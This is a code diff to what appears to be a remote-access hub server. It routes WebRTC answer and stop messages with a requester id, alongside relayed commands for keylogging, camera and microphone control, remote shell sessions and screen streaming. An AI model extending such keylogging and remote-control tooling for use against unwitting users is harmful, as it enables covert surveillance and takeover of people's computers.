@@ -537,7 +537,6 @@ def on_command(data):
 for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
              "keylog_on", "keylog_off",
              "shell_start", "shell_input", "shell_stop",
-             "webrtc_answer", "webrtc_stop",
              "pause_screen", "resume_screen",
              "start_screen_stream", "stop_screen_stream"):
     def _make_cmd_handler(ev):
@@ -546,6 +545,25 @@ for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
         _h.__name__ = f"cmd_{ev}"
         return _h
     socketio.on(_cmd)(_make_cmd_handler(_cmd))
+
+
+# WebRTC answer / stop must carry _requester so the PC can look up the
+# correct peer connection in webrtc_handler._peers (keyed by hub sid).
+# Simple _to_agent forwarding drops this, which silently breaks the
+# WebRTC handshake. Route them through a dedicated handler that
+# injects _requester = hub sid before forwarding.
+for _wcmd in ("webrtc_answer", "webrtc_stop"):
+    def _make_wrtc_handler(ev):
+        def _h(data):
+            target_name = (data or {}).get("_target")
+            target_sid  = name_to_sid.get(target_name)
+            if target_sid and _hub_may_reach(freq.sid, target_name):
+                payload = dict(data) if data else {}
+                payload["_requester"] = freq.sid
+                socketio.emit(ev, payload, room=target_sid)
+        _h.__name__ = f"wrtc_{ev}"
+        return _h
+    socketio.on(_wcmd)(_make_wrtc_handler(_wcmd))
 
 
 # keylog_status: agent → requester (response to keylog_on / keylog_off)
